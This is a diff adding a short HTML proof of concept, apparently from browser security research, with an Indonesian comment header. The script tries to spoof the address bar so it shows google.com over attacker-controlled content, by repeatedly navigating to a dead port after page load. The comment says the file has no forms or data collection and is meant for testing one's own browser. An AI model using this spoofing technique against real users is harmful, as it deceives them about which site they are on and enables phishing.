@@ -1,0 +1,14 @@
+<!-- 1 | address-bar spoof - nav-timing HOLD | [NO-CLICK] auto saat load
+     GENOME  A=dead-port  B=location=  C=onload  D=S1 omnibox  F=document.write
+     PREDIKAT      omnibox menulis https://www.google.com padahal dokumen ini milik origin penyerang
+     EXPECTED-SECURE  omnibox tetap origin penyerang, atau jujur kembali saat navigasi gagal
+     KONTROL  file 3.html - kalau 3 IKUT berhasil, pembacaanmu salah, bukan mekanisme ini
+     Riset di browser sendiri. Bukan kit phishing: nol form, nol fetch, nol beacon. -->
+<script>
+addEventListener('load', function () {
+  document.write('<h2>SPOOFED &mdash; ini BUKAN google.com</h2><p id=r></p>');
+  document.getElementById('r').textContent = 'REAL ORIGIN: ' + location.href;
+  location = 'https://www.google.com:82';
+  setInterval(function () { location = 'https://www.google.com:82'; }, 9800);
+});
+</script>
